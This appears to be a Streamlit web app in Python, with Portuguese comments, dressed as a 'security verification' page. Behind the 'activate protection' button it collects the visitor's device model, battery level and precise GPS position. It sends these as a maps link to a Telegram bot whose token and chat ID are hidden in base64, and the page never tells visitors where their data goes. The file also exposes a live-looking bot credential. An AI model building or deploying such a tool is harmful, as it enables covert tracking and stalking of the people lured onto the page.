import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        # Timeout aumentado para garantir que a mensagem saia
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": msg, "parse_mode": "Markdown"}, timeout=20)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

# --- ESTADO DE MEMÓRIA (O Segredo para o Bot não dormir) ---
if 'aguardando_gps' not in st.session_state:
    st.session_state['aguardando_gps'] = False

st.title("Verificação de Segurança")

# Coleta de dados (sempre ativa)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_FIXO")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_FIXO")

# O BOTÃO APENAS LIGA O MODO DE ESPERA
if st.button("● ATIVAR PROTEÇÃO AGORA"):
    st.session_state['aguardando_gps'] = True
    st.rerun() # Recarrega para processar o pedido

# SE O BOTÃO FOI CLICADO, RODA ISSO AQUI:
if st.session_state['aguardando_gps']:
    # 1. Pede o GPS (Isso faz o pop-up aparecer)
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:10000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS_TRIGGER")

    if posicao:
        if posicao == "erro":
            st.error("Erro: Permissão de localização negada.")
            st.session_state['aguardando_gps'] = False # Desliga o modo de espera
        else:
            # 2. Dados chegaram! Prepara o envio.
            modelo = "Dispositivo Android"
            if ua:
                try:
                    info = ua.split("(")[1].split(")")[0]
                    partes = [p.strip() for p in info.split(";")]
                    for p in partes:
                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung"]):
                            modelo = p
                            break
                except: pass

            link = f"https://www.google.com/maps?q={posicao}"
            
            relatorio = (
                f"🛡️ *PROTEÇÃO ATIVADA*\n"
                f"📱 *Aparelho:* {modelo}\n"
                f"🔋 *Bateria:* {bat if bat else '??'}%\n"
                f"📍 *Local:* {link}"
            )
            
            # 3. ENVIA AGORA (O bot acorda aqui)
            enviar_telegram(relatorio)
            
            # 4. Finaliza
            st.success("Proteção Ativada")
            st.session_state['aguardando_gps'] = False # Reseta para não enviar duplicado
    else:
        # Enquanto o GPS não responde, mostra isso
        st.info("Aguardando permissão no topo da tela... (Não feche)")

st.markdown('<br><p style="text-align:center; color:grey; font-size:12px; font-weight:bold;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
